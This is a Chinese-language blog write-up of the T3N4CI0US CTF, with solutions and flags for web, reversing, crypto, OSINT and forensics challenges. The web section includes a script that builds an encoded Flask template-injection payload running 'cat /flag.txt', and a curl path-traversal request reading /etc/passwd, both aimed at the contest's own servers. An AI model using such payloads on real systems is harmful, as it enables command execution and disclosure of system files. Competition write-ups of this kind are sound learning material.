---
title: T3N4CI0US CTF
date: 2022-08-12 14:27:31
tags:
       - 赛后复盘
       - CTF
categories: 
       - [赛后复盘]
       - [CTF]
---

![image-20220812150043235](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121500298.png?x-oss-process=hzy)

<!--more-->

-----------------------------------------

# PWN

## Check Check Check

> mic test one, two, three!!!
>
> IP : 34.64.203.138 Port : 10009

直接nc，find就出了

![image-20220810145248139](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101452243.png?x-oss-process=hzy)

T3N4CI0US{ZG9yb3Jvbmc/ZG9uZz9kaW5nPw}

# WEB

## world

![image-20220810150843662](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101508744.png?x-oss-process=hzy)

FLASK??莫非是ssti？但是找不到啥hint

试了试robots，是个提示吗？

![image-20220810151108596](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101511644.png?x-oss-process=hzy)

然后环境就炸了，最终这道题一直没写出来，不知道考察的是啥

后来和外国友人交流大致明白了，题目环境没了，放个脚本吧

```
import base64
from urllib.parse import quote


def rc4_main(key="init_key", message="init_message"):
    # print("RC4 Encrypt the main function ")
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return crypt


def rc4_init_sbox(key):
    s_box = list(range(256))
    # print(" The original  s  box ：%s" % s_box)
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    # print(" After the chaos  s  box ：%s"% s_box)
    return s_box


def rc4_excrypt(plain, box):
    # print(" Calling the encryptor succeeded .")
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = "".join(res)
    print("%s" % quote(cipher))
    return str(base64.b64encode(cipher.encode('utf-8')), 'utf-8')


rc4_main("HereIsTreasure",
         "{
   {config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}")
```

模仿的这道题目

[CISCN2019 华东南赛区\]Double Secret_aoao今晚吃什么的博客-CSDN博客](https://blog.csdn.net/aoao331198/article/details/124284420)

## Rosin

> [!] The flag.txt is located in the flag folder.

![image-20220810152902239](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101529314.png?x-oss-process=hzy)

flag在flag.txt里，这个提示和没有没啥区别

```
curl -v --path-as-is http://34.125.194.164:49157?url=file:///.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
```

![image-20220810175953239](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101759354.png?x-oss-process=hzy)

![image-20220810180008788](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101800836.png?x-oss-process=hzy)

再看一遍题目描述，这题出的真的很没质量，我以为多好的题呢，题目描述说的flag.txt在flag路径下，你题目里面又来个在root下，合着搞心态呢？？？？，最终还是伪协议直接读。。。。，我谢谢你

![image-20220810220248040](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102202112.png?x-oss-process=hzy)



T3N4CI0US{aa84_c1372_0a89de3c3_f0_1316340332a_2a055c065}

## cigarette

![image-20220810211545462](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102115528.png?x-oss-process=hzy)

签到题，抓包得flag

![image-20220810211608209](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102116274.png?x-oss-process=hzy)

T3N4CI0US{bc298e7_daf7_b2d4b347f67_c_56e9d_de34152_9ad99b1_7eb78}

## VISKA

![image-20220811164945307](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111649407.png?x-oss-process=hzy)

```
Vm0wd2QyUXlVWGxXYTFwT1ZsZFNXRll3Wkc5V01WbDNXa2M1VjAxV2JETlhhMXBQVm14S2MyTkljRmROYWxaeVZtcEtTMU5IVmtkWGJHUlRUVEZLVVZadGVGWmxSbGw0V2toR1VtSlZXbGhXYWtaTFUxWmFkR05GWkZwV01VcFlWVzAxVDFkSFNrZGpSVGxhWWxSR2RsWkdXbUZqYkhCSlkwZDRVMkV6UWxwV1ZFb3dZVEpHVjFOdVVsWmhlbXhoVm1wT1UyRkdVbGhsUjBacVlrWmFlVnBGV2xOVWJGcFpVV3h3VjFaNlJYZFdha1phWlZaT2NtRkhhRk5pVjJodlZtMXdUMVV5UmtkWGJGcFlZbFZhVkZSV2FFTlRiR3QzV2tSU1ZrMXJWalZhUkU1M1ZqRktSbGR0YUZwaGEzQkhXbFZhVDJSV1duTlRiV3hYVWpOb2IxWnRjRU5pTVVWNFdrVmthbEpXY0ZsWmJGWmhWbFpXY1ZKdFJsUlNiWFF6Vm14U1YxWXdNVVZTYTJoWFRWWktSRll3V2xwbGJGWjBZVVprYUdFeGNHaFhiRlpoWVRKT2MxcElUbWhTTW1oeldXeG9iMWRzV1hoWGJFNVRUVmQ0VjFSVmFHOWhSVEI1WVVac1dtRXhWWGhXTUZwaFpFZE9ObEp0ZUdsU2JrSktWa1phVjJFeVJrZFRXR2hZWVd0S2FGWnNXbUZqYkZweFVWaG9hbFpzY0hoV1IzaHJZVWRGZUdOR1VsaGlSbkJvVmtSS1RtVkdjRWxWYldoVFZrWmFVRlpHVmxka01XeFhWMjVPVm1Fd05YQlVWbFpYVGtaVmVXUkhkRnBXYXpWSVZUSTFSMVpXV2taalNGcGFUVlp3YUZwRlZYaFdWbEp5VGxkc1UySnJSak5XTVZKUFpERlplVkpyWkZoaWF6VnhWVEJrTkZkR2JITmhSVTVZVW14d2VGVldhRzlXUmtsM1YydGFWMUl6YUdoV2FrWkxWMVpHY21KR2FGaFRSVXBOVm10U1IxTXlVa2RVYmtwWVlYcHNXRmxZY0ZkV1ZscFlaVVprVjJGNlJsTlZSbEYzVUZFOVBRPT0=
```

反复base64解码就会得到flag

T3N4CI0US{d79fa6_2bc60_db3_5_da5512c3d_8896b7_0_2796d6_0cd}

# RE

## Swood

> string

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102305945.png?x-oss-process=hzy)



T3N4CI0US{da39a3ee5e6b4b0d3255bfef95601890afd80709}

## Warmup

一堆逻辑啥也不要问，签到题![image-20220811214214425](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208112142529.png?x-oss-process=hzy)

T3N4CI0US{773a_6d8c_c01fbc_f454646564_2_049eb4_3c2ad_852}

## WHISEN

> You'd hate to combine.

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s1[40]; // [rsp+0h] [rbp-50h] BYREF
  char *s2; // [rsp+28h] [rbp-28h]
  char v6[26]; // [rsp+36h] [rbp-1Ah] BYREF

  qmemcpy(v6, "}40_0hIfUrC{S_4rrc0NT03k3T", sizeof(v6));  //密文
  s2 = (char *)malloc(0x1AuLL);
  printf("Enter the Password : ");//加密逻辑，就是换顺序
  __isoc99_scanf("%s", s2);
  s1[0] = v6[25];
  s1[1] = v6[22];
  s1[2] = v6[19];
  s1[3] = v6[14];
  s1[4] = v6[10];
  s1[5] = v6[6];
  s1[6] = v6[4];
  s1[7] = v6[8];
  s1[8] = v6[12];
  s1[9] = v6[11];
  s1[10] = v6[16];
  s1[11] = v6[18];
  s1[12] = v6[21];
  s1[13] = v6[20];
  s1[14] = v6[3];
  s1[15] = v6[7];
  s1[16] = v6[2];
  s1[17] = v6[15];
  s1[18] = v6[13];
  s1[19] = v6[5];
  s1[20] = v6[14];
  s1[21] = v6[17];
  s1[22] = v6[23];
  s1[23] = v6[24];
  s1[24] = v6[9];
  if ( !strncmp(s1, s2, 0x1AuLL) )
    printf("Success! You found the flag!\n%s\n", s1);
  else
    puts("Incorrect Password !");
  return 0;
}
```

基本逻辑如上

![image-20220812113413999](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121134473.png?x-oss-process=hzy)

T3N4CI0US{r00T_f0r_h4ck3r}

## Rooftop

> string

基本逻辑如下

![image-20220814165317052](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141653708.png?x-oss-process=hzy)

跟进emmdee5函数

![image-20220814165407375](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141654444.png?x-oss-process=hzy)

字符反转之后md5解密

```
55347092ad1b19f9021174038078e57a
7ae5788003741102f9191bad92703455  // 两两翻转，整体倒置
i_don't_find_it..
```

![image-20220814171344434](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208141713537.png?x-oss-process=hzy)

[Hash md5: 7ae5788003741102f9191bad92703455 (md5hashing.net)](https://md5hashing.net/hash/md5/7ae5788003741102f9191bad92703455)

T3N4CI0US{i_don't_find_it..}

# MISC

## find me

> hello pls find Dolpari
>
> flag format : T3N4CI0US{Site URL}

在推特里面找到

![image-20220810174628292](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101746428.png?x-oss-process=hzy)

实在找不到了，开个提示吧，俩提示直接扣我五十积分

![image-20220810174846140](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101748189.png?x-oss-process=hzy)

![image-20220810174912333](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208101749373.png?x-oss-process=hzy)

T3N4CI0US{https://www.instagram.com/dolpari_05}

## Find us

> Hi, can you find us? Go into a site somewhere and look for us!

![image-20220811000329813](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208110003874.png?x-oss-process=hzy)

就是找官网呗

T3N4CI0US{https://t3n4ci0us.kr/member/}

# CRYPTO

## french

> French Ciper
>
> V3Y4GK0FW{EccrEs*Xpvtj*Icdc}

如此烂的题，，，二百多解居然一直解不出来，最终还是解出来了，查找了一下发现维吉尼亚是法国人，初步确定是维吉尼亚加密，但是需要密钥，怎么办？试了好久发现其加密方式，然后一个字符一个字符试出来的密钥，密钥是cle

![image-20220811120249174](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111202123.png?x-oss-process=hzy)

T3N4CI0US{CrypToVerryEasy}

交了不对，试了下_分隔开，对了

T3N4CI0US{CrypTo_Verry_Easy}

## ro

> [ W E = 360 ]   [ S N S = 360 ]   [ N E W S = ? ]

一个IQ问题

[智商问题 WE=360 SNS=360 如果是新闻*？ | jyankquiz](https://jyankquiz.com/iq問題　we＝360　sns＝360　ならば　news＝？/)

![image-20220813093843255](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130938332.png?x-oss-process=hzy)

T3N4CI0US{540}

## Before Porta arrives at the port!(复现)

> Before Porta arrives at the port! Decryption is required to interpret this..
>
> - ...-- -. ....- -.-. .. ----- ..- ... # --- .--- .- -.. .-.. -.. ..--.- ..- ..--.- .--. -.-- .--. ..--.- ...- ..--.- . ..-. --. --.. -..- --.. -..- #
>
> key = cle

刚开始是摩斯密码解密(/替换空格)然后porta解密

```
...--/-./....-/-.-./../-----/..-/.../#/---/.---/.-/-../.-../-../..--.-/..-/..--.-/.--./-.--/.--./..--.-/...-/..--.-/./..-./--./--../-..-/--../-..-/#

T3N4CI0USOJADLD_U_PYP_V_EFGZXZX
T3N4CI0US{OJADLD_U_PYP_V_EFGZXZX}
```

这题最终没写出来，最后需要porta解码，这个当时试了，但是不行，也不知道咋回事

![image-20220813093354793](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130934148.png?x-oss-process=hzy)

T3N4CI0US{CRYPTOIHADAPROBLEM}

[Porta Cipher - Online Decoder, Encoder (dcode.fr)](https://www.dcode.fr/porta-cipher)

# OSINT

## G0

> What is the name of the electronic store around the place in the picture?
>
> Please mark the space with _

![image-20220810230033828](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102300962.png?x-oss-process=hzy)

百度识图得到一个人的微博![image-20220810230103893](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102301956.png?x-oss-process=hzy)

谷歌识图![image-20220810230138654](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208102301818.png?x-oss-process=hzy)

秋葉原の電子部品【パーツランド】，交了不对，这栋楼叫Tokyo Radio Department Store Shops

T3N4CI0US{Tokyo_Radio_Department_Store_Shops}

## Japen Electronic

> Find me the type of this thing 
>
> Flag Format: T3N4CI0US{Type_Name}
>
> very easyyyyy

![img](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208130935396.jpeg?x-oss-process=hzy)

- Google `成田山深川`

- It is [Naritasan Fukagawa Fudōdō](https://goo.gl/maps/1iZreEdu82qvkWVy7)

- It is in the Fukagawa neighbourhood of the Koto district

  T3N4CI0US{Naritasan Fukagawa Fudōdō}

# Forensic

## docx

> I have a file of documents, and something is off.
>
> Flag : T3N4CI0US{...}

得到一个2.docx的附件，转压缩包，有一堆图片，看最大的那个

![image-20220811165418211](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111654437.png?x-oss-process=hzy)

搜FF D9，得到三个![image-20220811165500197](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111655286.png?x-oss-process=hzy)

有个jpg没有文件头，删到这![image-20220811165708154](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111657215.png?x-oss-process=hzy)

flag就出来了

![image-20220811165819581](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208111658822.png?x-oss-process=hzy)

T3N4CI0US{Is_1t_w0rt4_it_Escape?}

## yhparg(复现)

> I like Pokemon

![image-20220812234814598](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122348670.png?x-oss-process=hzy)

附件给的两张图，他的像素不一样，这两张图片不一样的地方就是flag

```
from PIL import Image

img2 = Image.open('2.png')
rgb_im2 = img2.convert('RGBA')

img1 = Image.open('1.png')
rgb_im1 = img1.convert('RGBA')

for i in range(250):
    for j in range(250):
        pix1 = rgb_im1.getpixel((i, j))
        pix2 = rgb_im2.getpixel((i, j))

        if pix1 != pix2:
            print(chr(pix2[0]), end="")
```

![image-20220812234628117](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208122346203.png?x-oss-process=hzy)

T3N4CI0US{H1D1N6_837W33N_1M463_15_C001_R1GHT?}

# 总结

![image-20220812145809785](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202208121458927.png?x-oss-process=hzy)

三天的比赛，打得不好，都是基础题，继续努力吧，团队赛，我却看不到我的团队，不知道说啥了，心累
